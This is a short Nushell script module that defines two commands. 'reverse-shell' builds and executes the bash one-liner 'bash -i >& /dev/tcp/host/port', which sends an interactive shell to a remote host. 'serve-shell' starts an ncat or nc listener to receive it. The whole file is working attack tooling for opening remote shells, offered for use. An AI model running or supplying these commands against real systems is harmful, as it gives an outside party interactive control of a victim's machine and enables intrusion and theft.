export def reverse-shell [host --print(-p)] {
    let h = $host | split row ':'
    let c = $'bash -i >& /dev/tcp/($h.0)/($h.1) 0>&1 2>&1'
    if $print {
        echo $c
    } else {
        bash -c $c
    }
}

export def serve-shell [port] {
    mut x = ''
    for c in [ncat nc] {
        if (which $c | is-not-empty) {
            $x = $c
            break
        }
    }
    ^$x -lvp $port
}
